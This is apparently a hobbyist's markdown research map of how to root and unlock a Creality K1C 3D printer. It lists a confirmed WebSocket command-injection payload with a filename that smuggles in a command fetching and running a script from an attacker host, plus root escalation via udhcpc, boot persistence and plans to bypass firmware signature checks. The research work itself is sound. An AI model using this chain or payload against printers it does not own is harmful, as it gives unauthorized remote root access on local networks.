# Creality K1C 2025 — Attack Surface Map

## Confirmed Hardware

- **SoC**: Ingenic XBurst2 X2600E (MIPS32r2 LE) — NOT Rockchip
- **Kernel**: 5.10.186, GCC 7.2.0 (Ingenic toolchain Release5.1.8-Default_xburst2)
- **OS**: Buildroot-based Linux
- **Storage**: eMMC (`/dev/mmcblk0`), 10 partitions
- **RAM**: ~1GB
- **SSH daemon**: Dropbear (already installed, runs at boot via `S50dropbear`)

## Partition Map

| Device       | Label        | Mount            | FS      | Writable | Notes                            |
|--------------|--------------|------------------|---------|----------|----------------------------------|
| mmcblk0p1    | signature    | —                | raw     | No       | Deplibs signature block          |
| mmcblk0p2    | sn_mac       | —                | raw     | No       | AES-encrypted serial + MAC       |
| mmcblk0p5    | kernel       | —                | raw     | No       | AES+signed, unknown recovery     |
| mmcblk0p7    | deplibs      | `/usr/deplibs`   | squashfs| No       | RSA+AES signed, **halt if bad**  |
| mmcblk0p8    | apps         | `/usr/apps`      | ext4    | **Yes**  | Encrypted app bins, persistence  |
| mmcblk0p9    | rootfs_data  | —                | ext4    | Yes      | Misc writable data               |
| mmcblk0p10   | userdata     | `/usr/data`      | ext4    | **Yes**  | User data, upgrade packages      |

## Attack Vectors

### 1. WebSocket Command Injection — CONFIRMED WORKING

**Status: Exploit exists and has been used successfully. See `tools/Creality-K1C-Tools/root-exploit/`.**

- **Vector**: WebSocket on port 9999 (`wsslicer` subprotocol)
- **Vulnerability**: `print` method sends a URL for the printer to download;
  the server response `Content-Disposition` filename is injected unsanitized
  into a shell command
- **Payload**: `filename="dest\";curl http://ATTACKER/bootstrap.sh | sh;#exploit.gcode"`
- **Privilege escalation**: `udhcpc -f -n -i lo -s /tmp/privesc.py -q` runs
  the privesc script as root (udhcpc requires CAP_NET_ADMIN / root)
- **Result**: SSH authorized_keys written, root shell via dropbear
- **Persistence**: `S999persistence` deployed to `/usr/apps/etc/init.d/` (survives reboot)
- **Requirements**: LAN access to printer, Python 3, `pip install websocket-client`

**Post-root infrastructure (deployed 2026-05-13):**
- `reccon` framebuffer recovery console (`/usr/apps/overlay/sbin/reccon`, init `S39console`) — USB keyboard at boot gives a shell before WiFi starts; WiFi-independent recovery path
- WiFi watchdog (`/usr/data/wifi_watchdog.sh`, launched by `S999persistence`) — polls every 30s, runs `wpa_cli reassociate` + DHCP renewal on disconnect
- `bssid=` removed from `/usr/data/wpa_supplicant.conf` — connects by SSID only, survives router BSSID changes
- Persistent SSH host keys (`S49dropbear_keys` + Dropbear restart in `S999persistence`) — stable host fingerprint across reboots; also included in exploit script on `persistent-ssh-keys` branch

```bash
python3 k1c-2025-exploit.py --host-ip <YOUR_IP> --printer-ip <PRINTER_IP> \
    --public-key ~/.ssh/id_ecdsa.pub
ssh root@<PRINTER_IP>
```

### 2. soc_security.ko Patch (SC_CMD_VERIFY Bypass) — READY (pending bug fix)

**Status: Patcher written, verified offsets correct, but B_NEXT_MIPS_LE bug must be fixed first.**

- **Vector**: Post-root. Load patched kernel module to bypass eFuse and RSA checks
- **Effect**: `cmd_sc -v` accepts any firmware package; enables self-signing
- **Risk**: Patched module must NOT load at boot — `seed.sh` calls SC_CMD_VERIFY
  on mmcblk0p7 at boot; failure halts device
- **Bug**: `B_NEXT_MIPS_LE = 0x10000000` creates infinite loop at delay slots.
  Fix: use `NOP_MIPS_LE = 0x00000000` for eFuse branch patches
- **Dependency**: Requires step 1 (root SSH) first
- See `notes/soc-security-analysis.md` for full details

### 3. UART / Serial Console — NOT YET ATTEMPTED

- **Vector**: Physical UART pads on mainboard (GND/RX2/TX2 header)
- **Baud**: 3,000,000 bps (confirmed from kernel logs — NOT 115200)
- **Value**: Boot log, possible u-boot interrupt, fallback if network exploit is patched
- **Risk**: Low (read-only until u-boot interaction)
- **Equipment needed**: USB-UART adapter (3.3V), Dupont wires

```bash
picocom -b 3000000 --databits 8 --parity n --stopbits 1 /dev/ttyUSB0
```

### 4. Official Permission File Unlock — THEORETICAL

**Status: Mechanism confirmed in seed.sh but requires Creality-signed file.**

`seed.sh` checks `/usr/data/permission` at boot:
- Verifies it with `cmd_sc -v` (RSA+eFuse check — same as firmware verify)
- If valid and MAC address matches device: `sed -i 's/^!root/root/' /tmp/shadow`
- This would unlock the root account in the shadow file without any exploit

This is Creality's official service-unlock path. Without their private signing key
it requires the SC_CMD_VERIFY bypass (Attack 2) to forge a valid permission file.
Lower priority since Attack 1 already gives root.

### 5. AES Key Extraction — NOT ATTEMPTED

- **Vector**: Post-root. Custom kernel module reads 24-byte AES key from
  `soc_security` BSS (`module_base + bss_offset + 0xbc`)
- **Value**: Enables fully offline firmware encryption — create app `.bin` files
  without printer hardware
- **Complexity**: Requires writing a small kernel module; `/dev/mem` may also work
  if `CONFIG_STRICT_DEVMEM` is not set
- **When needed**: Only if building completely custom firmware offline.
  For most goals, using `/dev/sc` through the running module is sufficient.

### 6. Firmware Update Package Analysis — PARTIALLY DONE

- OTA parser in `tools/Creality-K1C-Tools/OTA-Parser/`
- `upg_show.py` in the same directory
- Update state machine in `seed.sh` (`upg_do` function) is fully understood
- Packages placed at `/usr/data/upgrade/` with a `state` file trigger flashing on next boot
- Packages verified by `cmd_sc -v` — same bypass needed for custom packages

## Status Summary

| Attack                         | Status                          | Dependency          |
|-------------------------------|----------------------------------|---------------------|
| WebSocket RCE → root SSH      | **Complete** (2026-04-30)        | LAN access          |
| Post-root infrastructure      | **Complete** (2026-05-13)        | Root SSH            |
| soc_security.ko patch         | **Blocked** — MODULE_FLAG_PERMANENT | Root SSH ✓       |
| Option B: self-sign (no patch)| **Under investigation**          | Root SSH ✓          |
| UART console                  | Not attempted                    | Physical access     |
| Permission file unlock        | Theoretical (cloud removed)      | soc_security patch  |
| AES key extraction            | Not attempted                    | Root SSH ✓          |
| Custom firmware flash         | Not attempted                    | soc_security patch  |

**Note on patcher bug (soc-security-analysis.md):** The notes say the B_NEXT_MIPS_LE bug needs fixing, but the CURRENT patcher code at `tools/patch_soc_security.py` already uses `NOP_MIPS_LE` for eFuse patches (line 105). The notes are stale. Just regenerate `firmware/sc_patched.ko`:
```bash
pip install pyelftools  # already installed
python3 tools/patch_soc_security.py
```

**New blocker found 2026-05-13 — MODULE_FLAG_PERMANENT:**
`soc_security.ko` sets `MODULE_FLAG_PERMANENT` in its init code. `rmmod` returns
`EBUSY` even with refcount=0. `rmmod -f` also blocked (permanent check is prior to
force-unload path in kernel). Options to work around:
1. Build a helper `.ko` that calls `find_module("soc_security")` and clears the flag
2. Investigate Option B (self-sign using original module — eFuse passes on production)

**New findings on SC_CMD_VERIFY input format (2026-05-13):**
- Input buffer is 2048 bytes (not 15KB as previously believed)
- RSA modulus is at input[0x300], NOT input[0x3900] (those were MMIO offsets)
- RSA signature is at input[0x500], NOT input[0x3b00]
- input[0x200] is a physical RAM address for AES DMA — must be valid or AES hangs
- mmcblk0p1 is the SCBT signature partition (starts with `SCBThsqs`)
- `/dev/sc` enforces exclusive single-opener via BSS flag; stuck ioctl requires reboot
- eFuse bits ARE burned on this production unit (confirmed — eFuse check passes)

**Note on permission file (from binary analysis):** vectorp's root UI is a stub — it sets a flag in JSON config but the cloud API endpoint for receiving the signed permission file was removed by Creality for the 2025 revision. The `check_login_permission()` logic in `seed.sh` still works but requires a forged permission file (needs soc_security.ko bypass). SSH key auth via S999persistence already bypasses this entirely.

## App Binary Analysis Results (2025-04-30)

Full Ghidra analysis complete. Key findings from `firmware/apps_decrypted/`:

- **vectorp:** Root UI is a stub. Sets `odin+5504` flag in config. No cloud permission API present. IPC via POSIX shm. SSH key auth (current approach) is sufficient.
- **solusp:** Authorization code = ObbrecLidar AI sensor auth only (MD5 of sensor serial data). Not root-related. IPC via shm_open + semaphores. Klipper bridge via `/tmp/klippy_uds`.
- **nexusp:** File API tokens (`access.api_key`, `access.oneshot_token`). ACCESS_ROOT_NAME_LIST limits paths to `{config, gcodes, UDISK_NAME}`. SQLite + libzip + OpenSSL.
- **onyxp/thirteenthp:** WebRTC with JWT cloud auth. DTLS/SRTP for media. JWT validated server-side.
- **quintusp:** OTA command dispatcher + camera control. `reboot &` reachable via CMD dispatch.
- **mdns:** Simple mDNS advertisement daemon. No auth.
- **alchemistp:** Go binary, stripped. Connects to hardcoded IP `58.48.202.36`. IPC via `/tmp/alchemistp_*pipe`.

Detailed per-binary notes: `notes/binary-analysis/<name>/analysis.md`  
IPC map: `notes/ipc-protocol-map.md`

## Resources

- Firmware extracted from rooted device: `tools/K1C-2025-Firmware/`
- Exploit script: `tools/Creality-K1C-Tools/root-exploit/k1c-2025-exploit.py`
- OTA parser: `tools/Creality-K1C-Tools/OTA-Parser/`
- Ghidra project: `ghidra-projects/K1C-2025.gpr` (all 8 app binaries imported)
- Per-binary analysis: `notes/binary-analysis/`
- IPC protocol map: `notes/ipc-protocol-map.md`
- Community Discord: https://discord.gg/FffAZcUJtr
